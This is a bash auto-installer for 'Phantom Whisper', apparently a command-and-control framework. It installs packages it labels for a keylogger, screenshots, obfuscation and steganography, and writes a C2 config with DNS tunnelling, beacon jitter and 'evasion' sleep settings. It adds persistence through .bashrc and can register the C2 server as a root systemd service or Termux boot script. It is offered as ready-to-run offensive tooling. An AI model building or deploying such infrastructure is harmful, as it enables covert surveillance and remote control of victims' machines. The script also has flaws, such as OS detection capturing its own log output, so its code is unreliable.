#!/usr/bin/env bash
set -e

# ═══════════════════════════════════════════════════════════════════════════════
# Phantom Whisper — MASTER AUTO-INSTALLER
# One command to rule them all. Zero manual steps.
# Detects OS, installs deps, configures everything, offers to autostart.
# ═══════════════════════════════════════════════════════════════════════════════

VERSION="1.0.0"
PW_DIR="$HOME/Phantom-Whisper"
CONFIG_DIR="$HOME/.phantom"

# Colors
R="\033[91m"; G="\033[92m"; Y="\033[93m"; B="\033[94m"; M="\033[95m"; C="\033[96m"; N="\033[0m"; BO="\033[1m"

banner() {
    clear 2>/dev/null || true
    echo -e "${M}${BO}"
    echo '╔═══════════════════════════════════════════════════════════════════════╗'
    echo '║                                                                       ║'
    echo '║   ██████╗ ██╗    ██╗     ██████╗ ██████╗ ███╗   ███╗██████╗         ║'
    echo '║   ██╔══██╗██║    ██║    ██╔════╝██╔═══██╗████╗ ████║██╔══██╗        ║'
    echo '║   ██████╔╝██║ █╗ ██║    ██║     ██║   ██║██╔████╔██║██████╔╝        ║'
    echo '║   ██╔═══╝ ██║███╗██║    ██║     ██║   ██║██║╚██╔╝██║██╔══██╗        ║'
    echo '║   ██║     ╚███╔███╔╝    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║  ██║        ║'
    echo '║   ╚═╝      ╚══╝╚══╝      ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝        ║'
    echo '║                                                                       ║'
    echo "║               ${C}AUTO-INSTALLER v${VERSION}${M}                                     ║"
    echo '║          Zero manual steps — Just Works™                            ║'
    echo '╚═══════════════════════════════════════════════════════════════════════╝'
    echo -e "${N}"
}

log()     { echo -e "  ${C}[*]${N} $1"; }
ok()      { echo -e "  ${G}[✓]${N} $1"; }
warn()    { echo -e "  ${Y}[!]${N} $1"; }
fail()    { echo -e "  ${R}[✗]${N} $1"; }
header()  { echo -e "\n${BO}${B}══ $1 ══${N}\n"; }
ask()     { echo -e "  ${M}[?]${N} $1"; }

check_root() {
    if [ "$EUID" -eq 0 ]; then
        warn "Running as root. Some tools won't work in Termux."
    fi
}

detect_os() {
    OS="linux"
    if [ -n "$PREFIX" ] && echo "$PREFIX" | grep -qi "termux"; then
        OS="termux"
    elif [ "$(uname)" = "Darwin" ]; then
        OS="macos"
    fi
    log "Detected OS: ${BO}${OS}${N}"
    echo "$OS"
}

install_system_deps() {
    local os="$1"
    header "System Dependencies"

    if [ "$os" = "termux" ]; then
        log "Termux mode — using pkg..."
        pkg update -y 2>/dev/null | tail -1
        pkg upgrade -y 2>/dev/null | tail -1
        pkg install -y python python-pip git curl wget openssl 2>/dev/null | tail -3
        ok "System packages installed (Termux)"

    elif [ "$os" = "macos" ]; then
        log "macOS mode..."
        if ! command -v brew &>/dev/null; then
            log "Installing Homebrew..."
            /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" 2>/dev/null || true
        fi
        brew install python git curl wget openssl 2>/dev/null || true
        ok "System packages installed (macOS)"

    else
        log "Linux mode — checking apt..."
        if command -v apt &>/dev/null; then
            sudo apt update -qq 2>/dev/null | tail -1
            sudo apt install -y -qq python3 python3-pip git curl wget openssl xclip 2>/dev/null | tail -3
            ok "System packages installed (apt)"
        elif command -v yum &>/dev/null; then
            sudo yum install -y python3 python3-pip git curl wget openssl xclip 2>/dev/null | tail -3
            ok "System packages installed (yum)"
        elif command -v pacman &>/dev/null; then
            sudo pacman -S --noconfirm python python-pip git curl wget openssl xclip 2>/dev/null | tail -3
            ok "System packages installed (pacman)"
        else
            warn "Unknown package manager — install manually: python3, pip, git, curl"
        fi
    fi
}

install_python_deps() {
    header "Python Dependencies"
    pip3 install --quiet --upgrade pip 2>/dev/null || true

    # Core
    pip3 install --quiet rich requests cryptography dnspython 2>&1 | tail -1
    ok "Core: rich, requests, cryptography, dnspython"

    # Optional but recommended
    pip3 install --quiet pycryptodome 2>/dev/null && ok "Optional: pycryptodome (XChaCha20)" || warn "pycryptodome not available (XChaCha20 falls back to Fernet)"
    pip3 install --quiet websockets 2>/dev/null && ok "Optional: websockets (WebSocket C2)" || warn "websockets not available"
    pip3 install --quiet pynput 2>/dev/null && ok "Optional: pynput (keylogger)" || warn "pynput not available"
    pip3 install --quiet mss 2>/dev/null && ok "Optional: mss (screenshots)" || warn "mss not available"
    pip3 install --quiet pyarmor 2>/dev/null && ok "Optional: pyarmor (obfuscation)" || warn "pyarmor not available"
    pip3 install --quiet pillow 2>/dev/null && ok "Optional: pillow (image stego)" || warn "pillow not available"
    pip3 install --quiet requests[socks] 2>/dev/null && ok "Optional: socks5 proxy support" || true
    pip3 install --quiet aiohttp 2>/dev/null && ok "Optional: aiohttp (async HTTP)" || warn "aiohttp not available"
}

setup_config() {
    header "Configuration"
    mkdir -p "$CONFIG_DIR"/{logs,data,plugins,agents}
    log "Config directory: $CONFIG_DIR"

    # Generate random encryption password if not exists
    if [ ! -f "$CONFIG_DIR/.secret" ]; then
        openssl rand -base64 32 > "$CONFIG_DIR/.secret"
        chmod 600 "$CONFIG_DIR/.secret"
        ok "Generated encryption secret"
    fi

    # Create default config
    cat > "$CONFIG_DIR/config.json" << 'JSONEOF'
{
  "version": "1.0.0",
  "c2": {
    "dns_tunnel_domain": "c2.local",
    "dns_tunnel_port": 5353,
    "http_port": 8080,
    "ws_port": 8081,
    "c2_server_host": "0.0.0.0",
    "heartbeat_interval": 60,
    "jitter": 25
  },
  "encryption": {
    "kdf_iterations": 600000,
    "algorithm": "XChaCha20-Poly1305 + Fernet(AES-128-CBC)"
  },
  "evasion": {
    "adaptive_sleep": true,
    "min_sleep": 30,
    "max_sleep": 300,
    "jitter_percent": 25
  },
  "plugins": {
    "enabled": true,
    "auto_reload": true
  },
  "updater": {
    "auto_update": true,
    "check_interval_days": 7
  }
}
JSONEOF
    ok "Default config written"

    # Setup environment variables
    SECRET=$(cat "$CONFIG_DIR/.secret")
    {
        echo "# Phantom Whisper Environment"
        echo "export PW_C2_PASSWORD=\"$SECRET\""
        echo "export PW_C2_SALT=\"$(openssl rand -base64 16)\""
        echo "export PW_CONFIG_DIR=\"$CONFIG_DIR\""
        echo "export PW_AGENT_ID=\"$(hostname | md5sum 2>/dev/null | cut -c1-12 || echo 'phantom-'$(openssl rand -hex 6))\""
    } > "$CONFIG_DIR/env.sh"
    chmod 600 "$CONFIG_DIR/env.sh"
    ok "Environment variables configured"

    # Source env in .bashrc if not already
    if ! grep -q "PW_CONFIG_DIR" "$HOME/.bashrc" 2>/dev/null; then
        echo -e "\n# Phantom Whisper Environment\nsource $CONFIG_DIR/env.sh 2>/dev/null || true" >> "$HOME/.bashrc"
        ok "Added to .bashrc"
    fi
}

setup_c2_service() {
    local os="$1"
    header "C2 Server Autostart"

    ask "Install C2 server as a system service? (y/N): "
    read -r answer
    if [ "$answer" != "y" ] && [ "$answer" != "Y" ]; then
        ok "Skipped service installation"
        return
    fi

    if [ "$os" = "linux" ] && command -v systemctl &>/dev/null; then
        sudo tee /etc/systemd/system/phantom-c2.service > /dev/null << 'SYSEOF'
[Unit]
Description=Phantom Whisper C2 Server
After=network.target

[Service]
Type=simple
User=root
WorkingDirectory=/root/Phantom-Whisper
ExecStart=/usr/bin/python3 /root/Phantom-Whisper/c2_server.py 0.0.0.0 8080
Restart=always
RestartSec=10
EnvironmentFile=/root/.phantom/env.sh

[Install]
WantedBy=multi-user.target
SYSEOF
        sudo systemctl daemon-reload 2>/dev/null || true
        sudo systemctl enable phantom-c2 2>/dev/null || true
        ok "Systemd service installed (phantom-c2)"
        log "Start: sudo systemctl start phantom-c2"
        log "Dashboard: http://YOUR_IP:8080/api/v1/dashboard"

    elif [ "$os" = "termux" ]; then
        mkdir -p "$HOME/.termux/boot"
        cat > "$HOME/.termux/boot/phantom-c2.sh" << 'TERMUXEOF'
#!/data/data/com.termux/files/usr/bin/bash
cd ~/Phantom-Whisper
python c2_server.py 0.0.0.0 8080 &
TERMUXEOF
        chmod +x "$HOME/.termux/boot/phantom-c2.sh"
        ok "Termux:Boot service created"
    else
        warn "No systemd detected — running manually: python3 c2_server.py 0.0.0.0 8080"
    fi
}

setup_sample_plugin() {
    header "Sample Plugins"
    mkdir -p "$PW_DIR/plugins"
    cat > "$PW_DIR/plugins/hello_world.py" << 'PYEOF'
#!/usr/bin/env python3
"""Sample Phantom Whisper plugin — Hello World with system info."""
NAME = "Hello World"
VERSION = "1.0"
AUTHOR = "Plugins System"
DESCRIPTION = "Sample plugin showing the plugin system works"

def run(app=None):
    import platform, os
    info = {
        "plugin": NAME,
        "version": VERSION,
        "system": platform.system(),
        "node": platform.node(),
        "release": platform.release(),
        "cwd": os.getcwd(),
        "message": "Phantom Whisper Plugin System is ALIVE!"
    }
    return info

if __name__ == "__main__":
    print(run())
PYEOF
    chmod +x "$PW_DIR/plugins/hello_world.py"
    ok "Sample plugin created: plugins/hello_world.py"
}

run_tests() {
    header "Installation Verification"
    errors=0

    # Check Python
    if command -v python3 &>/dev/null; then
        ok "Python: $(python3 --version 2>&1)"
    else
        fail "Python not found!"; errors=$((errors+1))
    fi

    # Check pip
    if command -v pip3 &>/dev/null; then
        ok "pip: $(pip3 --version 2>&1 | head -1)"
    else
        fail "pip not found!"; errors=$((errors+1))
    fi

    # Check packages
    for pkg in rich requests cryptography dnspython; do
        if python3 -c "import $pkg" 2>/dev/null; then
            ok "Package: $pkg"
        else
            fail "Package: $pkg"; errors=$((errors+1))
        fi
    done

    # Check main files
    for f in "phantom_whisper.py" "c2_server.py" "pw_install.sh"; do
        if [ -f "$PW_DIR/$f" ]; then
            ok "File: $f ($(du -h "$PW_DIR/$f" | cut -f1))"
        else
            fail "File: $f MISSING"; errors=$((errors+1))
        fi
    done

    # Check config
    if [ -f "$CONFIG_DIR/config.json" ]; then
        ok "Config: $CONFIG_DIR/config.json"
    else
        fail "Config missing"; errors=$((errors+1))
    fi

    echo
    ask "Run a quick syntax check on all Python files? (Y/n): "
    read -r answer
    if [ "$answer" != "n" ] && [ "$answer" != "N" ]; then
        for f in "$PW_DIR"/*.py; do
            if python3 -m py_compile "$f" 2>/dev/null; then
                ok "Syntax OK: $(basename $f)"
            else
                fail "Syntax ERROR: $(basename $f)"; errors=$((errors+1))
            fi
        done
    fi

    echo
    if [ $errors -eq 0 ]; then
        echo -e "\n${G}${BO}╔════════════════════════════════════════════════════════════════╗${N}"
        echo -e "${G}${BO}║               INSTALLATION COMPLETE — ZERO ERRORS               ║${N}"
        echo -e "${G}${BO}╚════════════════════════════════════════════════════════════════╝${N}"
    else
        echo -e "\n${R}${BO}  $errors error(s) found. Re-run installer or fix manually.${N}"
    fi
}

show_quickstart() {
    echo
    echo -e "${BO}${C}═══════════════════════════════════════════════════════════════════${N}"
    echo -e "${BO}${C}                      PHANTOM WHISPER — START HERE                  ${N}"
    echo -e "${BO}${C}═══════════════════════════════════════════════════════════════════${N}"
    echo
    echo -e "  ${G}Interactive Mode:${N}"
    echo -e "    cd ~/Phantom-Whisper && python phantom_whisper.py"
    echo
    echo -e "  ${G}C2 Server (start in separate terminal):${N}"
    echo -e "    cd ~/Phantom-Whisper && python c2_server.py 0.0.0.0 8080"
    echo
    echo -e "  ${G}Web Dashboard:${N}"
    echo -e "    http://localhost:8080/api/v1/dashboard"
    echo
    echo -e "  ${G}WebSocket Dashboard (real-time):${N}"
    echo -e "    http://localhost:8081/ws_dashboard"
    echo
    echo -e "  ${G}Run Plugins:${N}"
    echo -e "    cd ~/Phantom-Whisper && python plugins/hello_world.py"
    echo
    echo -e "  ${G}Headless Recon:${N}"
    echo -e "    python phantom_whisper.py --recon"
    echo
    echo -e "  ${G}Auto-Update:${N}"
    echo -e "    python phantom_whisper.py --update"
    echo
    echo -e "  ${M}✨ Phantom Whisper v${VERSION} — Fully Operational${N}"
    echo -e "  ${M}✨ by 🇭🇷 PhonkAlphabet${N}"
    echo
}

# ─── MAIN ──────────────────────────────────────────────────────────────────────

main() {
    banner
    echo -e "${BO}${C}  This installer will set up EVERYTHING automatically.${N}"
    echo -e "${C}  No manual steps. No configuration. Just run and go.${N}"
    echo
    ask "Proceed with full installation? (Y/n): "
    read -r proceed
    if [ "$proceed" = "n" ] || [ "$proceed" = "N" ]; then
        echo -e "${Y}  Installation cancelled.${N}"
        exit 0
    fi

    cd "$HOME"

    OS=$(detect_os)
    check_root
    install_system_deps "$OS"
    install_python_deps
    setup_config
    setup_sample_plugin
    setup_c2_service "$OS"
    run_tests
    show_quickstart
}

main
